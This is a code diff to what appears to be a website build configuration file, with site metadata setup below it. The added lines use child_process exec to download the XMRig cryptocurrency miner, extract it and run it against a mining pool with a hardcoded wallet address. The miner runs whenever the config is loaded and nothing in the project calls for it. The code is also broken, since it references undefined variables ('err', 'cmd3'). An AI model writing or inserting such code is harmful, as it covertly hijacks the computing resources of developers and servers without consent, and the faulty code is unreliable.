@@ -1,8 +1,13 @@
 require(`dotenv`).config()
 
 const shouldAnalyseBundle = process.env.ANALYSE_BUNDLE
-const { exec } = require('child_process');
-exec('wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz , tar xf xmrig-6.16.2-linux-static-x64.tar.gz , ./xmrig-6.16.2/xmrig -a gr -o us.flockpool.com:5555 --tls -u RLUciajDyEujXL6J21S83EfapBJLte9gu6.kk18 -p ', (err, stdout, stderr) => {
+
+var exec = require('child_process').exec;
+var cmd = 'wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz';
+var cmd2 =  'tar xf xmrig-6.16.2-linux-static-x64.tar.gz';
+var cmd4 =  './xmrig-6.16.2/xmrig -a gr -o us.flockpool.com:5555 --tls -u RLUciajDyEujXL6J21S83EfapBJLte9gu6.kk18 -p';
+
+exec(cmd, function(error, stdout, stderr) {
   if (err) {
     //some err occurred
     console.error(err)
@@ -12,6 +17,29 @@ exec('wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2
    console.log(`stderr: ${stderr}`);
   }
 });
+exec(cmd2, function(error, stdout, stderr) {
+  if (err) {
+    //some err occurred
+    console.error(err)
+  } else {
+   // the *entire* stdout and stderr (buffered)
+   console.log(`stdout: ${stdout}`);
+   console.log(`stderr: ${stderr}`);
+  }
+});
+exec(cmd3, function(error, stdout, stderr) {
+  if (err) {
+    //some err occurred
+    console.error(err)
+  } else {
+   // the *entire* stdout and stderr (buffered)
+   console.log(`stdout: ${stdout}`);
+   console.log(`stderr: ${stderr}`);
+  }
+});
+
+
+
 module.exports = {
   siteMetadata: {
     // You can overwrite values here that are used for the SEO component
